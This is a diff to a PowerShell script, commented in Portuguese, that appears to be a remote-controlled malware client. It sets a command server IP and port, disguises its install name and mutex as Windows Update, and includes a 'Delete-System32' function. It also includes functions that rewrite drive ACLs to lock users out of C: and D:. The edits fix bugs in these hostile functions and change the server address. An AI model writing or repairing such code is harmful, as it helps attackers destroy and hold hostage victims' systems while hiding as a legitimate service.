@@ -8,7 +8,7 @@ Versão: 10.0.19045.1 - Ultimate Edition
 #>
 
 # ===== CONFIGURACOES =====
-$serverIP = "198.1.195.194"  # MUDE PARA SEU IP
+$serverIP = "192.168.0.4"  # MUDE PARA SEU IP
 $serverPort = 4000
 $installName = "WinUpdateSvc"
 $mutexName = "Global\MicrosoftWindowsUpdateService"
@@ -323,14 +323,14 @@ function Delete-System32 {
     }
 }
 
-# ===== TRAVAR DISCOS (CORRIGIDO COM ${drive}) =====
+# ===== TRAVAR DISCOS (CORRIGIDO COMPLETAMENTE) =====
 function Lock-Drives {
     param([string[]]$Drives = @("C:", "D:"))
     $results = @()
     foreach ($drive in $Drives) {
         try {
             Write-DebugLog "Travando drive ${drive}"
-            $path = $drive + "\"
+            $path = "${drive}\"
             if (Test-Path $path) {
                 $acl = Get-Acl $path
                 $acl.SetAccessRuleProtection($true, $false)
@@ -340,14 +340,14 @@ function Lock-Drives {
                 $acl.AddAccessRule($accessRule2)
                 Set-Acl $path $acl
                 
-                $results += "$drive travado"
+                $results += "${drive} travado"
                 Write-DebugLog "Drive ${drive} travado"
             } else {
-                $results += "$drive não encontrado"
+                $results += "${drive} não encontrado"
             }
         } catch {
             Write-DebugLog "Erro ao travar drive ${drive}: $_"
-            $results += "$drive erro"
+            $results += "${drive} erro"
         }
     }
     return "DRIVES_LOCKED:" + ($results -join ";")
@@ -359,7 +359,7 @@ function Unlock-Drives {
     foreach ($drive in $Drives) {
         try {
             Write-DebugLog "Destravando drive ${drive}"
-            $path = $drive + "\"
+            $path = "${drive}\"
             if (Test-Path $path) {
                 $acl = Get-Acl $path
                 $acl.SetAccessRuleProtection($false, $true)
@@ -368,14 +368,14 @@ function Unlock-Drives {
                     $acl.RemoveAccessRule($rule)
                 }
                 Set-Acl $path $acl
-                $results += "$drive destravado"
+                $results += "${drive} destravado"
                 Write-DebugLog "Drive ${drive} destravado"
             } else {
-                $results += "$drive não encontrado"
+                $results += "${drive} não encontrado"
             }
         } catch {
             Write-DebugLog "Erro ao destravar drive ${drive}: $_"
-            $results += "$drive erro"
+            $results += "${drive} erro"
         }
     }
     return "DRIVES_UNLOCKED:" + ($results -join ";")
